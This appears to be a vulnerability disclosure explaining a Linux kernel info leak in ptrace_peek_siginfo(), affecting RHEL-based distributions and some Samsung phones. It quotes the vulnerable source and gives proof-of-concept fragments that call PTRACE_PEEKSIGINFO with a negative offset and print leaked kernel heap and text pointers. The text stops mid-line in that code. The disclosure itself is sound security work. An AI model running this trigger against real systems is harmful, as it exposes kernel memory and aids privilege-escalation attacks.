<p>ptrace: add ability to retrieve signals without removing from a queue (v4) https://github.com/torvalds/linux/commit/84c751bd4aebbaae995fe32279d3dba48327bad4</p>



<p>signal/ptrace: Don’t leak unitialized kernel memory with PTRACE_PEEK_SIGINFO https://github.com/torvalds/linux/commit/f6e2aa91a46d2bc79fce9b93a988dbe7655c90c0</p>



<p>As it’s shown in this report, even though the vulnerability was fixed on upstream it still affects some Linux systems as Red Hat Enterprise Linux 7/8, the distributions based on it (CentOS 7/8, Oracle Linux 7/8 and CloudLinux 7/8) and at least two android devices, Samsung S9 and S10+.</p>



<p><em>The vulnerability</em></p>



<p>The vulnerability resides in the ptrace subsystem. The function <code>ptrace_peek_siginfo()</code> receives a pointer from the user that points to <code>struct ptrace_peeksiginfo_args</code> and copies the content from that pointer to kernel address space. One of the members of the <code>struct ptrace_peeksiginfo_args</code> is the <code>off</code> variable. The definition of the <code>struct ptrace_peeksiginfo_args</code> can be seen below:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">struct ptrace_peeksiginfo_args </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    u64 off;    </span><span class="enlighter-c1">/* Ordinal position in queue at which</span></div></div><div class=""><div><span class="enlighter-c1">            to start copying signals */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    u32 flags;  </span><span class="enlighter-c1">/* PTRACE_PEEKSIGINFO_SHARED or 0 */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    s32 nr;     </span><span class="enlighter-c1">/* Number of signals to copy */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">struct ptrace_peeksiginfo_args {
    u64 off;    /* Ordinal position in queue at which
            to start copying signals */
    u32 flags;  /* PTRACE_PEEKSIGINFO_SHARED or 0 */
    s32 nr;     /* Number of signals to copy */
};</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct ptrace_peeksiginfo_args {
    u64 off;    /* Ordinal position in queue at which
            to start copying signals */
    u32 flags;  /* PTRACE_PEEKSIGINFO_SHARED or 0 */
    s32 nr;     /* Number of signals to copy */
};</pre>



<p>The function <code>ptrace_peek_siginfo()</code> doesn’t validate the <code>off</code> variable passed by the user before using it in the following statement <code>s32 off = arg.off + i</code> on line 721. The variable <code>arg.off</code> is of the type unsigned long (8 bytes) and the variable <code>off</code> is of the type s32 (4 bytes). The variable <code>arg.off</code> is larger and of different signedness but the issue arises because the function <code>ptrace_peek_siginfo()</code> doesn’t check if the variable <code>off</code> is already negative after getting its value from <code>arg.off + i</code>. The variable <code>off</code> is used to check if the function needs to copy data to the user, it does so if the variable <code>off</code> is negative. AS it started off as negative, the check <code>if (off &gt;= 0)</code> fails and then the kernel stack variable <code>kernel_siginfo_t info</code> is copied to the user without being cleared or initialized.</p>



<p>Below we show the source code of the vulnerable function as found in the latest kernel release (kernel-4.18.0-240.15.1.el8_3) on Red Hat Enterprise Linux 8.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">File: linux-</span><span class="enlighter-n0">4.18</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">-</span><span class="enlighter-n0">240.15</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">el8_3</span><span class="enlighter-text">/kernel/ptrace.</span><span class="enlighter-m3">c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">694</span><span class="enlighter-text"> static int </span><span class="enlighter-m0">ptrace_peek_siginfo</span><span class="enlighter-g1">(</span><span class="enlighter-text">struct task_struct *child,</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">695</span><span class="enlighter-text">                                 unsigned long addr,</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">696</span><span class="enlighter-text">                                 unsigned long data</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">697</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">698</span><span class="enlighter-text">         struct ptrace_peeksiginfo_args arg;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">699</span><span class="enlighter-text">         struct sigpending *pending;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">700</span><span class="enlighter-text">         struct sigqueue *q;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">701</span><span class="enlighter-text">         int ret, i;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">702</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">703</span><span class="enlighter-text">         ret = </span><span class="enlighter-m0">copy_from_user</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;arg, </span><span class="enlighter-g1">(</span><span class="enlighter-k1">void</span><span class="enlighter-text"> __user *</span><span class="enlighter-g1">)</span><span class="enlighter-text"> addr,</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">704</span><span class="enlighter-text">                                 </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">struct ptrace_peeksiginfo_args</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">705</span><span class="enlighter-text">         </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">ret</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">706</span><span class="enlighter-text">                 </span><span class="enlighter-k1">return</span><span class="enlighter-text"> -EFAULT;</span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">719</span><span class="enlighter-text">         </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> arg.</span><span class="enlighter-m3">nr</span><span class="enlighter-text">; </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">720</span><span class="enlighter-text">                 kernel_siginfo_t info;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">721</span><span class="enlighter-text">                 s32 off = arg.</span><span class="enlighter-m3">off</span><span class="enlighter-text"> + i;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">722</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">725</span><span class="enlighter-text">                         </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!off--</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">726</span><span class="enlighter-text">                                 </span><span class="enlighter-m0">copy_siginfo</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;info, &amp;q-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">info</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">727</span><span class="enlighter-text">                                 break;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">728</span><span class="enlighter-text">                         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">729</span><span class="enlighter-text">                 </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">732</span><span class="enlighter-text">                 </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">off </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">= </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-c1">/* beyond the end of the list */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">733</span><span class="enlighter-text">                         break;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">734</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">747</span><span class="enlighter-text">                         siginfo_t __user *uinfo = </span><span class="enlighter-g1">(</span><span class="enlighter-text">siginfo_t __user *</span><span class="enlighter-g1">)</span><span class="enlighter-text"> data;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">748</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">749</span><span class="enlighter-text">                         </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">copy_siginfo_to_user</span><span class="enlighter-g1">(</span><span class="enlighter-text">uinfo, &amp;info</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">750</span><span class="enlighter-text">                                 ret = -EFAULT;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">751</span><span class="enlighter-text">                                 break;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">752</span><span class="enlighter-text">                         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">762</span><span class="enlighter-text">         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">767</span><span class="enlighter-text">         </span><span class="enlighter-k1">return</span><span class="enlighter-text"> ret;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">768</span><span class="enlighter-text"> </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div></div><div class="enlighter-raw">File: linux-4.18.0-240.15.1.el8_3/kernel/ptrace.c
---
694 static int ptrace_peek_siginfo(struct task_struct *child,
695                                 unsigned long addr,
696                                 unsigned long data)
697 {
698         struct ptrace_peeksiginfo_args arg;
699         struct sigpending *pending;
700         struct sigqueue *q;
701         int ret, i;
702 
703         ret = copy_from_user(&amp;arg, (void __user *) addr,
704                                 sizeof(struct ptrace_peeksiginfo_args));
705         if (ret)
706                 return -EFAULT;
...
719         for (i = 0; i &lt; arg.nr; ) {
720                 kernel_siginfo_t info;
721                 s32 off = arg.off + i;
722 
725                         if (!off--) {
726                                 copy_siginfo(&amp;info, &amp;q-&gt;info);
727                                 break;
728                         }
729                 }
...
732                 if (off &gt;= 0) /* beyond the end of the list */
733                         break;
734 
747                         siginfo_t __user *uinfo = (siginfo_t __user *) data;
748 
749                         if (copy_siginfo_to_user(uinfo, &amp;info)) {
750                                 ret = -EFAULT;
751                                 break;
752                         }
...
762         }
...
767         return ret;
768 }
---</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">File: linux-4.18.0-240.15.1.el8_3/kernel/ptrace.c
---
694 static int ptrace_peek_siginfo(struct task_struct *child,
695                                 unsigned long addr,
696                                 unsigned long data)
697 {
698         struct ptrace_peeksiginfo_args arg;
699         struct sigpending *pending;
700         struct sigqueue *q;
701         int ret, i;
702 
703         ret = copy_from_user(&amp;arg, (void __user *) addr,
704                                 sizeof(struct ptrace_peeksiginfo_args));
705         if (ret)
706                 return -EFAULT;
...
719         for (i = 0; i &lt; arg.nr; ) {
720                 kernel_siginfo_t info;
721                 s32 off = arg.off + i;
722 
725                         if (!off--) {
726                                 copy_siginfo(&amp;info, &amp;q-&gt;info);
727                                 break;
728                         }
729                 }
...
732                 if (off &gt;= 0) /* beyond the end of the list */
733                         break;
734 
747                         siginfo_t __user *uinfo = (siginfo_t __user *) data;
748 
749                         if (copy_siginfo_to_user(uinfo, &amp;info)) {
750                                 ret = -EFAULT;
751                                 break;
752                         }
...
762         }
...
767         return ret;
768 }
---</pre>



<p>The kernel distribued by Red Hat is the same one used by other distributions as CentOS 7/8, Oracle Linux 7/8 and CloudLinux 7/8. Checking those distributions, we confirm the vulnerability also affects them.</p>



<p><em>The proof of concept</em></p>



<p>To take advantage of the vulnerability we need to use the <code>ptrace()</code> system call to reach the vulnerable function <code>ptrace_peek_siginfo()</code>. It’s possible to do that using the request <code>PTRACE_PEEKSIGINFO</code> but before calling it, the process needs to attach to other process in order to use the ptrace subsystem. The first thing the proof of concept does is to create a child process that does nothing and just waits for an user input through the <code>getchar()</code> system call. After this, the parent process can then attach to the child process using ptrace <code>PTRACE_ATTACH</code> request.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">File: leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">23</span><span class="enlighter-text">         pid = </span><span class="enlighter-m0">fork</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">24</span><span class="enlighter-text">         </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid == </span><span class="enlighter-n1">0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">25</span><span class="enlighter-text">                 </span><span class="enlighter-m0">getchar</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">26</span><span class="enlighter-text">                 </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">27</span><span class="enlighter-text">         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">28</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">29</span><span class="enlighter-text">         </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-m0">ptrace</span><span class="enlighter-g1">(</span><span class="enlighter-text">PTRACE_ATTACH,pid,</span><span class="enlighter-k1">NULL</span><span class="enlighter-text">,</span><span class="enlighter-k1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">30</span><span class="enlighter-text">                 </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ptrace attach"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">31</span><span class="enlighter-text">                 </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">32</span><span class="enlighter-text">         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">33</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">34</span><span class="enlighter-text">         </span><span class="enlighter-m0">waitpid</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid, </span><span class="enlighter-k1">NULL</span><span class="enlighter-text">, </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div></div><div class="enlighter-raw">File: leak.c
---
23         pid = fork();
24         if(pid == 0){
25                 getchar();
26                 exit(EXIT_FAILURE);
27         }
28 
29         if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) &lt; 0){
30                 perror("ptrace attach");
31                 exit(EXIT_FAILURE);
32         }
33 
34         waitpid(pid, NULL, 0);
---</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">File: leak.c
---
23         pid = fork();
24         if(pid == 0){
25                 getchar();
26                 exit(EXIT_FAILURE);
27         }
28 
29         if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) &lt; 0){
30                 perror("ptrace attach");
31                 exit(EXIT_FAILURE);
32         }
33 
34         waitpid(pid, NULL, 0);
---</pre>



<p>The function <code>ptrace_peek_siginfo()</code> receives two user pointers, both of them are of the type struct <code>ptrace_peeksiginfo_args</code>. The first one is to pass the parameters to retrieve the information and the second one is the struct <code>ptrace_peeksiginfo_ars</code> the data retrieved are copied to. When triggering the vulnerability, the uninitialized stack data from the kernel will be copied to the second argument. More information about the <code>PTRACE_PEEKSIGINFO</code> request can be found on the ptrace manual and are pasted below:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">PTRACE_PEEKSIGINFO</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">since Linux </span><span class="enlighter-n0">3.10</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Retrieve siginfo_t structures without removing signals from a queue.  addr points to a ptrace_peeksiginfo_args structure that specifies the ordinal position from which copying </span><span class="enlighter-k1">of</span><span class="enlighter-text"> signals should start, and the number </span><span class="enlighter-k1">of</span><span class="enlighter-text"> signals to copy.  siginfo_t structures are copied into the buffer pointed to by data.  The </span><span class="enlighter-k1">return</span><span class="enlighter-text"> value contains the number </span><span class="enlighter-k1">of</span><span class="enlighter-text"> copied </span><span class="enlighter-m0">signals</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">zero indicates that there is no signal corresponding to the specified ordinal position</span><span class="enlighter-g1">)</span><span class="enlighter-text">.  Within the returned siginfo structures, the si_code field includes </span><span class="enlighter-m0">information</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">__SI_CHLD, __SI_FAULT, etc.</span><span class="enlighter-g1">)</span><span class="enlighter-text"> that are not otherwise exposed to user space.</span></div></div></div><div class="enlighter-raw">PTRACE_PEEKSIGINFO (since Linux 3.10)
Retrieve siginfo_t structures without removing signals from a queue.  addr points to a ptrace_peeksiginfo_args structure that specifies the ordinal position from which copying of signals should start, and the number of signals to copy.  siginfo_t structures are copied into the buffer pointed to by data.  The return value contains the number of copied signals (zero indicates that there is no signal corresponding to the specified ordinal position).  Within the returned siginfo structures, the si_code field includes information (__SI_CHLD, __SI_FAULT, etc.) that are not otherwise exposed to user space.</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PTRACE_PEEKSIGINFO (since Linux 3.10)
Retrieve siginfo_t structures without removing signals from a queue.  addr points to a ptrace_peeksiginfo_args structure that specifies the ordinal position from which copying of signals should start, and the number of signals to copy.  siginfo_t structures are copied into the buffer pointed to by data.  The return value contains the number of copied signals (zero indicates that there is no signal corresponding to the specified ordinal position).  Within the returned siginfo structures, the si_code field includes information (__SI_CHLD, __SI_FAULT, etc.) that are not otherwise exposed to user space.</pre>



<p>As discussed in the earlier section, to make the kernel to skip the initialization of the struct <code>kernel_siginfo_t info</code> and leaking uninitialized data to the user, the parameter <code>off</code> needs to be negative and this is what it’s done below. The content of the variable <code>nr</code> is the number of signals the code would like to get. In the case of the vulnerability, it might lead to additional data to be leaked to the user. The proof of concept provided in this report uses the value of <code>nr</code> according to what have been observed running the proof of concept on the vulnerable targets.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">File: leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">36</span><span class="enlighter-text">         a.</span><span class="enlighter-m3">off</span><span class="enlighter-text"> = </span><span class="enlighter-n1">-1</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">37</span><span class="enlighter-text">         a.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> = LLEAK;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">38</span><span class="enlighter-text">         a.</span><span class="enlighter-m3">flags</span><span class="enlighter-text"> = </span><span class="enlighter-n1">0</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">39</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">40</span><span class="enlighter-text">         </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-m0">ptrace</span><span class="enlighter-g1">(</span><span class="enlighter-text">PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">41</span><span class="enlighter-text">                 </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ptrace"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">42</span><span class="enlighter-text">                 </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">43</span><span class="enlighter-text">         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div></div><div class="enlighter-raw">File: leak.c
---
...
36         a.off = -1;
37         a.nr = LLEAK;
38         a.flags = 0;
39 
40         if(ptrace(PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b) &lt; 0){
41                 perror("ptrace");
42                 exit(EXIT_FAILURE);
43         }
...
---</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">File: leak.c
---
...
36         a.off = -1;
37         a.nr = LLEAK;
38         a.flags = 0;
39 
40         if(ptrace(PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b) &lt; 0){
41                 perror("ptrace");
42                 exit(EXIT_FAILURE);
43         }
...
---</pre>



<p>After the execution of the system call above, the content on the struct <code>b</code> should contain uninitialized stack data from the kernel. The proof of concept then just needs to print them out.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">ile: leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">45</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #ifdef S10</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">46</span><span class="enlighter-text">                 </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">7</span><span class="enlighter-text">; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">47</span><span class="enlighter-text">                         heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">48</span><span class="enlighter-text">                         text = </span><span class="enlighter-g1">((</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">32</span><span class="enlighter-text"> </span><span class="enlighter-g0">|</span><span class="enlighter-text"> b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">49</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">50</span><span class="enlighter-text">                         </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">51</span><span class="enlighter-text">                         </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span 